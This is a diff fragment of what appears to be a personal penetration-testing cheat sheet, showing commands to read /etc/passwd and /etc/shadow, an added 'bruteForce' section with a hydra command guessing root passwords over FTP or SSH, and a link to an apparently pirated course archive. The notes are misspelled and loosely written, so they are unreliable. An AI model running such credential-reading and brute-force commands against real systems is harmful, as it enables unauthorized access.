@@ -42,6 +42,12 @@ sudo -l
 cat /etc/passwd
 cat /etc/shadow
 
+                            bruteForce
+                            __________
 
+hydra // hyra -h you see example commad 
+hydra -l root -P /usr/share/metaexploit/password.txt (ftp/ssh)ip:port -t 4 -V //you use any passwordlist like metaexploit password list ,dib pass list and so more.
+
+ https://vip.linuxia.ir/VIP/PA/AWS%20Cloud%20Security%20Bootcamp/Pentester%20Academy%20-%20AWS%20Cloud%20Security%20Bootcamp%202021%20hide01.ir.zip 
 
 
